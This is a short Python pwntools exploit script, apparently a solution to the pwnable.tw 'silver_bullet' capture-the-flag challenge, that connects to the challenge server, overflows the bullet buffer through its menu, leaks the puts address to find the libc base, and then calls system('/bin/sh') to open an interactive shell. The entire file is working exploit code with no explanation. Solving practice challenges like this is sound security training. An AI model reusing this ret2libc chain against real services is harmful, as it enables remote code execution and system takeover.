import pwn
from pwn import * 
elf = ELF("./silver_bullet")
#p = elf.process()
p = remote("chall.pwnable.tw", 10103)
context.arch = "i386"
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./libc_32.so.6")
context.log_level = "DEBUG"
pop_ebx = p32(0x08048475)

def createbullet(payload): 
 #p.recvuntil(b"choice :")
 p.sendline(b"1")
 p.recvuntil(b"bullet :")
 p.sendline(payload)
 p.recvuntil(b"Good luck !!")

def powerup(payload):
 #p.recvuntil(b"choice :")
 p.sendline(b"2")
 p.recvuntil(b"bullet :")
 p.sendline(payload)
 p.recvuntil(b"Enjoy it !")

def beat():
 #p.recvuntil(b"choice :")
 p.sendline(b"3")

createbullet(b"A"*47)
powerup(b"B"*1)
payload = b"\xff\xff\xff" + b"AAAA" + p32(elf.plt["puts"])  + p32(elf.sym["main"])  + p32(elf.got["puts"])
powerup(payload)
beat()

p.recvuntil(b"Oh ! You win !!\n")
leak = u32(p.recv()[:4])
#print(hex(leak))
libc.address = leak - libc.sym["puts"]
log.info("libc adress is:" + hex(libc.address))
binsh = next(libc.search(b"/bin/sh"))

createbullet(b"A"*47)
powerup(b"B"*1)
payload = b"\xff\xff\xff" + b"AAAA" + p32(libc.sym["system"]) + p32(libc.sym["exit"]) + p32(binsh)
powerup(payload)
beat()

p.interactive()
